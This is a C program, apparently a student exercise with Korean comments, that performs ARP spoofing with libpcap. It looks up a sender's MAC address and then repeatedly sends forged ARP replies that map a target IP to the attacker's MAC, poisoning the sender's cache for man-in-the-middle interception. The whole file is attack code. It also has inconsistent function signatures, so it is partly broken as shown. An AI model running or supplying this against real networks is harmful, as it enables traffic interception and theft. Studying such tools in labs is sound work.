#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include<arpa/inet.h>
#include<sys/socket.h>
#include<netinet/in.h>
#include<sys/ioctl.h>
#include<net/if.h>
#include<stdint.h>
#include <stdbool.h>
#include "stc.h"
#define ARP_REQUEST 1
#define ARP_REPLY 2
#define ETHERTYPE_ARP 0x0806
#define ARPHRD_ETHER 1
#define ETHERTYPE_IP 0x0800
#define byte uint8_t

byte attacker[4];

typedef struct arp_packet {
    struct libnet_ethernet_hdr eth_hdr;
    struct libnet_arp_hdr arp_hdr;
    byte src_mac[ETHER_ADDR_LEN];
    byte src_ip[4];
    byte dst_mac[ETHER_ADDR_LEN];
    byte dst_ip[4];
}arp_packet;

struct arp_pair {
    char sender[16];
    char target[16];
};

char * getIfToIP(char *ifName){
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, ifName, IFNAMSIZ-1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    close(fd);
    return inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);
}

void print_mac_address(const byte *mac) {
    for (int i = 0; i < ETHER_ADDR_LEN; i++) {
        printf("%02x", mac[i]);
        if (i < ETHER_ADDR_LEN - 1) printf(":");
    }
    printf("\n");
}
void printBuffer(byte *buf, size_t len) {
    for (size_t i = 0; i < len; ++i) {
        printf("%02x ", buf[i]);
        if ((i + 1) % 16 == 0) {
            printf("\n"); 
        }
    }
    printf("\n over!");
    printf("\n"); // 바이트 확인용 함수
}
int get_mac_addr(const char *iface, byte *mac) { // 스택오버플로우
    int fd;
    struct ifreq ifr;
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if(fd < 0) {
        perror("Socket error");
        return -1;
    }
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if(ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("Invalid MAC address");
        close(fd);
        return -1;
    }
    close(fd);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    return 0;
}
byte src_mac[ETHER_ADDR_LEN];
void request_broad(byte *packet, byte *src_mac, byte *src_ip, byte *dst_ip) {
    arp_packet * arp_req = (arp_packet *) packet;
    memset(arp_req->eth_hdr.ether_dhost, 0xff, ETHER_ADDR_LEN);
    memcpy(arp_req->eth_hdr.ether_shost, src_mac, ETHER_ADDR_LEN);
    arp_req->eth_hdr.ether_type = htons(ETHERTYPE_ARP);
    arp_req->arp_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_req->arp_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_req->arp_hdr.ar_hln = ETHER_ADDR_LEN;
    arp_req->arp_hdr.ar_pln = 4;
    arp_req->arp_hdr.ar_op = htons(ARP_REQUEST);
    memcpy(arp_req->src_mac, src_mac, ETHER_ADDR_LEN);
    memcpy(arp_req->src_ip, src_ip, 4);
    memset(arp_req->dst_mac, 0x00, ETHER_ADDR_LEN);
    memcpy(arp_req->dst_ip, dst_ip, 4);
    printf("request over\n");
}
void reply_target_to_sender(byte *packet, byte *sender_mac, byte *sender_ip, byte *target_ip,byte * target_mac) { //sender에게 보내는거
    arp_packet * arp_reply = (arp_packet *) packet; 
    memcpy(arp_reply->eth_hdr.ether_dhost, sender_mac, ETHER_ADDR_LEN);
    memcpy(arp_reply->eth_hdr.ether_shost, target_mac, ETHER_ADDR_LEN);
    arp_reply->eth_hdr.ether_type = htons(ETHERTYPE_ARP);
    arp_reply->arp_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_reply->arp_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_reply->arp_hdr.ar_hln = ETHER_ADDR_LEN;
    arp_reply->arp_hdr.ar_pln = 4;
    arp_reply->arp_hdr.ar_op = htons(ARP_REPLY);

    byte target[4] = {0};
    byte sender[4] = {0};
    inet_pton(AF_INET,target_ip,target);
    inet_pton(AF_INET,sender_ip,sender);
    memcpy(arp_reply->src_mac, target_mac, ETHER_ADDR_LEN);
    memcpy(arp_reply->src_ip, target, 4);
    memcpy(arp_reply->dst_mac, sender_mac, ETHER_ADDR_LEN);
    memcpy(arp_reply->dst_ip, sender, 4);
    printf("\n");
    printBuffer(packet,42);

}
void arp_spoofing(const char *dev, struct arp_pair *pairs, int pair_cnt,char **argv) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (!pcap) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", dev, errbuf);
        exit(1);
    }

    byte attacker_mac[6];
    if(get_mac_addr(dev, attacker_mac) != 0) {
        fprintf(stderr, "failed to get MAC address\n");
        exit(1);
    }

    
    //byte packet[sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr)];
    byte packet[50];
    byte sender_mac[ETHER_ADDR_LEN];
    for(int i = 0; i < pair_cnt; i++) {
        memset(packet, 0, sizeof(packet));
        print_mac_address(attacker_mac);
        get_sender_mac(i+1,argv,dev,&sender_mac,attacker_mac);
        reply_target_to_sender(packet, sender_mac, pairs[i].sender, pairs[i].target,attacker_mac);
        if (pcap_sendpacket(pcap, packet, sizeof(packet)) != 0) {
            fprintf(stderr, "failed to send ARP");}
        if (pcap_sendpacket(pcap, packet, sizeof(packet)) != 0) {
            fprintf(stderr, "failed to send ARP");}
        if (pcap_sendpacket(pcap, packet, sizeof(packet)) != 0) {
            fprintf(stderr, "failed to send ARP");}
        if (pcap_sendpacket(pcap, packet, sizeof(packet)) != 0) {
            fprintf(stderr, "failed to send ARP");}
        if (pcap_sendpacket(pcap, packet, sizeof(packet)) != 0) {
            fprintf(stderr, "failed to send ARP");}
        if (pcap_sendpacket(pcap, packet, sizeof(packet)) != 0) {
            fprintf(stderr, "failed to send ARP");}
        else {
            printf("ARP attack success\n");
        }

    }

    pcap_close(pcap);
}



void get_sender_mac(int cnt, char **argv, const char *dev,byte *sender_mac) {
    pcap_t *pcap;
    byte pack[50];
    byte src_ip[4], dst_ip[4]; // sender , target
    char errbuf[PCAP_ERRBUF_SIZE];
    byte src_mac[ETHER_ADDR_LEN];
    memset(pack, 0, sizeof(pack));
    if (get_mac_addr(dev, src_mac) != 0) { //attacker mac
        fprintf(stderr, "failed to get MAC address\n");
        exit(1);
    }
    print_mac_address(src_mac);
    inet_pton(AF_INET, argv[2 * cnt], src_ip);
    inet_pton(AF_INET, argv[2 * cnt + 1], dst_ip);

    request_broad(pack, src_mac, attacker, src_ip); //(pack, attacker_mac, attacker_ip, sender_ip)
    pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live error\n");
        exit(1);
    }

    if (pcap_sendpacket(pcap, pack, sizeof(pack)) != 0) {
        fprintf(stderr, "failed to send ARP\n");
        exit(1);
    } 
    while (true) {
        struct pcap_pkthdr header;
        const u_char *packet;
        
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue; 
        
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            exit(1);
        }
        if (res == 1) {
            arp_packet * arp_reply = (arp_packet *) packet;
            
            printBuffer(arp_reply->src_ip,4);
            
            printBuffer(src_ip,4);

            if (!memcmp(arp_reply->src_ip,src_ip,4)){
                
                if (ntohs(arp_reply->eth_hdr.ether_type) == ETHERTYPE_ARP) {
                    
                    if (ntohs(arp_reply->arp_hdr.ar_op) == ARPOP_REPLY) {
                        
                        printf("ARP Reply from: ");
                        
                        memcpy(sender_mac, arp_reply->src_mac, ETHER_ADDR_LEN);
                        
                        print_mac_address(sender_mac);
                        
                        return;
                    }
                }
                
            }
        }
    }
    pcap_close(pcap);
}



int main(int argc, char **argv) {
    if (argc < 4) {
        printf("Usage: %s <interface> <sender ip> <target ip> [<sender ip> <target ip> ...]\n", argv[0]);
        exit(1);
    }
    
    byte * x = getIfToIP(argv[1]);
    inet_pton(AF_INET,x,attacker);
    printBuffer(attacker,4);
    

    const char *dev = argv[1];
    int pair_cnt = (argc - 2) / 2;
    struct arp_pair pairs[pair_cnt];
    for(int i = 0; i < pair_cnt; i++) {
        strcpy(pairs[i].sender, argv[2 + i * 2]);
        strcpy(pairs[i].target, argv[3 + i * 2]);
    }
    arp_spoofing(dev, pairs, pair_cnt,argv);

    
    return 0;
}
